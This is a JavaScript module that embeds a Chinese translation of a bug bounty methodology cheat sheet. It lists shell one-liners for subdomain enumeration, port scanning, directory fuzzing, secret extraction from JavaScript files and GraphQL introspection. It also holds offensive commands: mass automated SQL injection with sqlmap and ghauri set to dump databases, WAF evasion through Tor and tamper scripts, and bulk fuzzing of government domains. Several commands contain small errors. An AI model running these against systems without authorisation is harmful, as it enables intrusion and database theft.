const t=`https://github.com/sudosuraj/Awesome-Bug-Bounty

# **\u8D85\u68D2\u7684\u6F0F\u6D1E\u8D4F\u91D1\u8BA1\u5212**

\\_ \u7531@sudosuraj \u63D0\u51FA\u7684 Web \u6E17\u900F\u6D4B\u8BD5\u65B9\u6CD5  
\u8FD9\u662F\u6211\u7684\u4E2A\u4EBA\u4ED3\u5E93\uFF0C\u5305\u62EC\u6F0F\u6D1E\u8D4F\u91D1\u63D0\u793A\u3001\u5DE5\u5177\u96C6\u5408\u3001\u6211\u4E2A\u4EBA\u5728\u641C\u5BFB\u6F0F\u6D1E\u65F6\u559C\u6B22\u7684\u5355\u884C\u4EE3\u7801\u7B49\u7B49\u3002\u5B83\u6B63\u5728\u5F00\u53D1\u4E2D\uFF0C\u6B22\u8FCE\u968F\u610F[\u8D21\u732E](https://github.com/sudosuraj/Awesome-Bug-Bounty/issues/new)\u3002

## **\u5DE5\u5177\u5B89\u88C5**

\\#\\!/bin/bash

go install \\-v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest  
go install \\-v github.com/tomnomnom/anew@latest  
go install github.com/tomnomnom/assetfinder@latest  
go install github.com/projectdiscovery/katana/cmd/katana@latest  
go install github.com/tomnomnom/waybackurls@latest  
go install github.com/hakluke/hakrawler@latest  
go install github.com/d3mondev/puredns/v2@latest  
go install \\-v github.com/projectdiscovery/dnsx/cmd/dnsx@latest  
go install github.com/lc/gau/v2/cmd/gau@latest  
go install github.com/utkusen/socialhunter@latest  
go install \\-v github.com/PentestPad/subzy@latest  
go install github.com/003random/getJS/v2@latest  
\\#https://github.com/0xRyuk/crtsh.git  
sudo apt install python3-pip  
pip3 install uro  
pip3 install urless  
pipx install bbot

git clone https://github.com/0xRyuk/crtsh.git /tmp/crtsh  
pip3 install \\-r /tmp/crtsh/requirments.txt  
sudo mkdir \\-p /opt/crtsh  
sudo cp /tmp/crtsh/crtsh.py /opt/crtsh/  
sudo echo 'alias crtsh="python3 /opt/crtsh/crtsh.py"'\\>\\>\\~/.zshrc  
. \\~/.zshrc

git clone https://github.com/m4ll0k/SecretFinder.git /tmp/secretfinder  
pip install \\-r /tmp/secretfinder/requirements.txt  
sudo mkdir \\-p /opt/secretfinder  
sudo cp /tmp/secretfinder/SecretFinder.py  /opt/secretfinder/secretfinder.py  
sudo echo 'alias secretfinder="python3 /opt/secretfinder/secretfinder.py"'\\>\\>\\~/.zshrc  
. \\~/.zshrc

git clone https://github.com/GerbenJavado/LinkFinder.git  
cd LinkFinder  
sudo mkdir \\-p /opt/linkfinder  
sudo cp linkfinder.py /opt/linkfinder/linkfinder.py  
sudo echo 'alias linkfinder="python3 /opt/linkfinder/linkfinder.py"'\\>\\>\\~/.zshrc  
. \\~/.zshrc

## **\u5B50\u57DF\u540D**

### **\u679A\u4E3E\uFF1A**

subfinder \\-dL domains.txt \\-all  \\-recursive | anew rawsubdomains.txt

cat domains.txt | while read domain; do assetfinder $domain \\-subs-only && anew rawsubdomains.txt; done

cat domains.txt | while read domain; do crtsh \\-d $domain && anew rawsubdomains.txt; done

for i in $(cat domains.txt);do bbot \\-t $i \\-p subdomain-enum; done

### **\u6B63\u5728\u89E3\u51B3\uFF1A**

\\#\\!/bin/bash  
subfinder \\-dL domains.txt \\-all  \\-recursive | anew rawsubdomains.txt  
cat domains.txt | while read domain; do assetfinder $domain \\-subs-only && anew rawsubdomains.txt; done   
cat domains.txt | while read domain; do crtsh \\-d $domain && anew rawsubdomains.txt; done

wget https://raw.githubusercontent.com/proabiral/Fresh-Resolvers/master/resolvers.txt  
echo 8.8.8.8 \\>\\> trusted.txt  
echo 8.8.4.4 \\>\\> trusted.txt  
massdns \\-r resolvers.txt \\-t A \\-o S rawsubdomains.txt \\-w resolved0.txt  
cat resolved0.txt | awk '{print $1}' | sed 's/\\\\.$//' | sort \\-u | anew subdomains.txt  
dnsx \\-l rawsubdomains.txt \\-r resolvers.txt \\-a \\-resp \\-o resolved1.txt  
cat resolved1.txt |awk '{print $1}' | sed 's/\\\\.$//' | sort \\-u | anew subdomains.txt  
puredns resolve rawsubdomains.txt \\-r resolvers.txt \\--resolvers-trusted trusted.txt | anew resolved2.txt  
cat resolved2.txt | awk '{print $1}' | sort \\-u | anew subdomains.txt

cat resolved\\*.txt | grep \\-E \\-o '((25\\[0-5\\]|2\\[0-4\\]\\[0-9\\]|\\[01\\]?\\[0-9\\]\\[0-9\\]?)\\\\.){3}(25\\[0-5\\]|2\\[0-4\\]\\[0-9\\]|\\[01\\]?\\[0-9\\]\\[0-9\\]?)' | anew IPs.txt

rm \\-rf resolve\\*.txt && rm \\-rf trusted.txt

 cat IPs.txt | httpx-toolkit \\-title \\-ports 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8443,8888,30821 \\-threads 300 anew alive.txt 

 cat subdomains.txt | httpx-toolkit \\-title \\-ports 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8443,8888,30821 \\-threads 300 | anew alive.txt

echo Done\\!

### **\u5B50\u57DF\u540D\u63A5\u7BA1**

subzy run \\--targets alive.txt

## **\u67E5\u627E\u6B63\u5728\u8FD0\u884C\u7684\u670D\u52A1\uFF1A**

[https://raw.githubusercontent.com/Bo0oM/services-names-wordlist/master/list.txt](https://raw.githubusercontent.com/Bo0oM/services-names-wordlist/master/list.txt)

## **\u65AD\u94FE\u52AB\u6301**

socialhunter \\-f alive.txt

## **\u4ECEIPs.txt \u4E0A\u7684[ports.txt](https://github.com/sudosuraj/Awesome-Bug-Bounty/blob/main/ports.txt)\u626B\u63CF\u7AEF\u53E3**

sudo masscan $(cat IPs.txt)  \\-p0-65535 \\--rate 1000 \\--wait 3 2\\> /dev/null | grep \\-o \\-P '(?\\<=port ).\\*(?=/)' | anew ports.txt

## **\u4F7F\u7528 Naabu \u8FDB\u884C\u7AEF\u53E3\u626B\u63CF**

naabu \\-list domains.txt \\-c 50 \\-nmap-cli 'nmap \\-sCV' | anew naabufull.txt  
naabu \\-list subdomains.txt \\-c 50 \\-nmap-cli 'nmap \\-sCV' | anew naabufull.txt

## **\u67E5\u627E\u6280\u672F**

cat urls.txt| while read urls; do webtech \\-u $urls; done

## **\u5185\u5BB9\u53D1\u73B0**

dirsearch \\-l alive.txt \\-x 500,502,503,429 \\-R 5 \\--random-agent \\-t 100 \\-F  \\-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

cat subdomains.txt | httpx \\-title \\-td \\-sc \\-fr | anew alive.txt

cat alive.txt | gau | anew allurls.txt

katana \\-u alive.txt \\-d 5 \\-ps \\-pss waybackarchive,commoncrawl,alienvault \\-kf \\-jc \\-fx \\-ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg \\-o allurls.txt

katana \\-u alive.txt \\-d 4 \\-f qurl \\-o allurls.txt

cat alive.txt | hakrawler | anew allurls.txt

cat allurls.txt | grep \\-E "\\\\.txt|\\\\.log|\\\\.cache|\\\\.secret|\\\\.db|\\\\.backup|\\\\.bkp|\\\\.yml|\\\\.json|\\\\.gz|\\\\.rar|\\\\.gzip|\\\\.zip|\\\\.config"

## **\u53C2\u6570\u53D1\u73B0**

### **\u6536\u96C6\u5E26\u53C2\u6570\u7684 URL**

cat allurls.txt|grep \\-v \\-i \\-E "\\\\.js" | grep \\-P '(?\\<=\\\\?|&)\\\\w+(?==|&)' | uro | tee \\-a paramsurls.txt

for i in $(cat subdomains.txt); do paramspider \\-d $i | anew paramurls.txt; done

### **\u6536\u96C6\u53C2\u6570\u5355\u8BCD\u4F5C\u4E3A\u5355\u8BCD\u8868**

cat allurls.txt | grep \\-oP '(?\\<=\\\\?|&)\\\\w+(?==|&)' |  tee \\-a params.txt

## **\u67E5\u627E\u5E76\u679A\u4E3E JavaScript \u6587\u4EF6**

cat allurls.txt | grep \\-i \\-E "\\\\.js" | egrep \\-v "\\\\.json" | httpx \\-mc 200 | anew jsfiles.txt

while read \\-r url; do  
  if curl \\-s \\-o /dev/null \\-w "%{http\\_code}" "$url" | grep \\-q 200 && \\\\  
     curl \\-s \\-I "$url" | grep \\-iq 'Content-Type:.\\*\\\\(text/javascript\\\\|application/javascript\\\\)'; then  
    echo "$url"  
  fi  
done \\< jsfiles.txt \\> livejsfiles.txt

\\# https://github.com/m4ll0k/SecretFinder

cat jsfiles.txt | while read url; do python3 secretfinder.py \\-i $url \\-o cli \\>\\> secrets.txt; done

nuclei \\-l jsfiles.txt \\-t /home/enma/nuclei-templates/http/exposures/ \\-o jsecrets.txt

cat jsfiles.txt | while read url; do linkfinder \\-i $url \\-o cli \\>\\> endpoints-js.txt; done

cat jsfiles.txt | xargs \\-I{} python3 /opt/linkfinder/linkfinder.py \\-i {} \\-o cli | anew endpoints-js.txt

\\# Download JS Files

\\#\\# curl  
mkdir \\-p js\\_files; while IFS= read \\-r url || \\[ \\-n "$url" \\]; do filename=$(basename "$url"); echo "Downloading $filename JS..."; curl \\-sSL "$url" \\-o "downloaded\\_js\\_files/$filename"; done \\< "$1"; echo "Download complete."

\\#\\# wget  
sed \\-i 's/\\\\r//' js.txt && for i in $(cat liveJS.txt); do wget "$i"; done

## **GraphQL API**

grep \\-r \\-i \\-o \\-E "http\\[s\\]?://\\[a-zA-Z0-9./?=\\_-\\]\\*\\\\b(graphql)" | anew graphql\\_endpoints.txt  
grep \\-r \\-i "graphql\\\\|mutation" . | anew graphql\\_endpoints.txt

### **POST \u8BF7\u6C42\u81EA\u7701\u67E5\u8BE2\uFF1A**

{"query": "query IntrospectionQuery{\\_\\_schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on \\_\\_Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on \\_\\_InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on \\_\\_Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

### **GET \u8BF7\u6C42\u81EA\u7701\u67E5\u8BE2\uFF1A**

/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}

\u76F8\u5173\u6587\u7AE0\uFF1A[https ://medium.com/@jonathanmondaut/from-developer-to-hacker-breaking-into-graphql-6083c80b4588](https://medium.com/@jonathanmondaut/from-developer-to-hacker-breaking-into-graphql-6083c80b4588)

## **SQLi \u5355\u884C\u4EE3\u7801**

cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | anew tmp-sqli.txt && sqlmap \\-m tmp-sqli.txt \\--batch \\--random-agent \\--level 5 \\--risk 3 \\--dbs && for i in $(cat tmp-sqli.txt); do ghauri \\-u "$i" \\--level 3 \\--dbs \\--current-db \\--batch \\--confirm; done

\\_ \u5728 sqlmap/ghauri \u7684\u8F93\u51FA\u6587\u4EF6\u5939\u4E2D\u627E\u5230\u54EA\u4E2A\u4E3B\u673A\u5B58\u5728\u6F0F\u6D1E root@bb:\\~/.local/share/sqlmap/output:  
	find \\-type f \\-name "log" \\-exec sh \\-c 'grep \\-q "Parameter" "{}" && echo "{}: SQLi"' \\\\;

\\_ \u4F7F\u7528 TOR \u7ED5\u8FC7 WAF  
	sqlmap \\-r request.txt \\--time-sec=10 \\--tor \\--tor-type=SOCKS5 \\--check-tor \\--dbs \\--random-agent \\--tamper=space2comment

\u4F7F\u7528 SQLmap Tamper \u811A\u672C\u7ED5\u8FC7 WAF  
	sqlmap \\--list-tampers | grep "\\*" | awk '{print $2}' | grep ".py" | tr '\\\\n' ','| sed 's/.py//g'

	sqlmap \\-u 'http://www.site.com/search.cmd?form\\_state=1' \\--level=5 \\--risk=3 \\--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes \\--no-cast \\--no-escape \\--dbs \\--random-agent

## **\u67E5\u627E\u5355\u4E2A\u57DF\u7684 IP \u548C ASN**

\`dig +short target.com| xargs -n 1 -I {} whois -h whois.cymru.com {} | grep -oE "([0-9]{1,3}\\.){3}[0-9]{1,3}"\`

## **\u67E5\u627E\u591A\u4E2A\u57DF\u540D\u7684 IP \u548C asn**

### **1**

\`cat domains.txt | xargs -I {} -n 1 dig +short {} | xargs -n 1 -I {} whois -h whois.cymru.com {} | grep -oE "([0-9]{1,3}\\.){3}[0-9]{1,3}"\`

### **2**

\`cat subfinder.txt | dnsx -silent -a -resp-only | anew IPs.txt\`

## **0xNinja \u5B50\u57DF\u540D\u679A\u4E3E**

### **1 \u5355\u4E2A\u57DF\u540D\u7684\u5B50\u57DF\u540D\u679A\u4E3E**

\`python3 cet.py --domain target.com | sed -e 's:^ *::g' -e 's:^*\\.::g' -e '/^$/d' | sed -e 's:*.::g' | sort -u | grep -o -E '\\b[a-zA-Z0-9.-]*target[a-zA-Z0-9.-]*\\.(com)\\b' |tee -a 2.txt\`  
\`./crt.sh paytmlabs.com | tee -a 2.txt\`

### **2 \u591A\u4E2A\u57DF\u7684\u5B50\u57DF\u540D\u679A\u4E3E\uFF08inscope-domains.txt\uFF09**

\`cat inscope-domains.txt | xargs -I {} -n 1 python3 cet.py --domain {} | sed -e 's:^ *::g' -e 's:^*\\.::g' -e '/^$/d' | sed -e 's:*.::g' | sort -u | grep -o -E '\\b[a-zA-Z0-9.-]*target[a-zA-Z0-9.-]*\\.(com)\\b' |tee -a 2.txt\`  
\`cat inscope-domains.txt | xargs -I {} -n 1 bash crt.sh | tee -a 2.txt\`

### **3 \u89E3\u6790\u5B9E\u65F6\u5B50\u57DF\u540D**

\u4E0B\u8F7D\u6700\u65B0\u7684\u89E3\u6790\u5668\uFF1A[\u8FD9\u91CC](https://raw.githubusercontent.com/proabiral/Fresh-Resolvers/master/resolvers.txt)  
\`wget https://raw.githubusercontent.com/proabiral/Fresh-Resolvers/master/resolvers.txt\`  
\`massdns -r resolvers.txt -t A -o S subdomains.txt -w resolved.txt\`  
\`puredns resolve subdomains.txt -r resolvers.txt --resolvers-trusted trusted.txt | anew resolved2.txt\`  
\`dnsx -l subdomains.txt -r resolvers.txt -a -resp -o resolved1.txt\`

### **4\\. \u67E5\u627E\u591A\u4E2A\u9876\u7EA7\u57DF\u540D\u7684\u5B50\u57DF\u540D**

while read domain; do if host \u201C$domain\u201D \\> /dev/null; then echo $domain;fi;done\\<DutchGov.txt \\>\\> domains.txt  
for sub in $(cat domains.txt);do subfinder \\-d $sub \\-o $sub.dutch;done  
cat \\*.dutch \\> all.sub

### **5\\. \u540C\u65F6\u5BF9\u591A\u4E2A\u57DF\u8FDB\u884C FUZZ**

for i in $(cat all.sub); do echo\u201D\u201D; echo \u201CSubdomain of $i\u201D;echo \u201C\u201D;gobuster dir \\-w wordlist.txt \\-u $i \\-e \\-o tmp ;cat tmp \\>\\> dutch.fuzz; echo \u201C\u201D; done

## **\u67E5\u627E\u5355\u4E2A\u57DF\u540D\u7684 IP \u5730\u5740**

\`dig +short target.com | xargs -n 1 -I {} whois -h whois.cymru.com {} | tee IPs.txt\`

## **\u67E5\u627E\u591A\u4E2A\u57DF\u540D\u7684 IP \u5730\u5740**

\`cat domains.txt | xargs -I {} -n 1 dig +short {} | xargs -n 1 -I {} whois -h whois.cymru.com {} | tee IPs.txt\`

## **\u4F7F\u7528 censys \u6536\u96C6 IP**

\`censys search hackerone.com | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d \\"\\, | tee IPs.txt\`  
`;export{t as _};
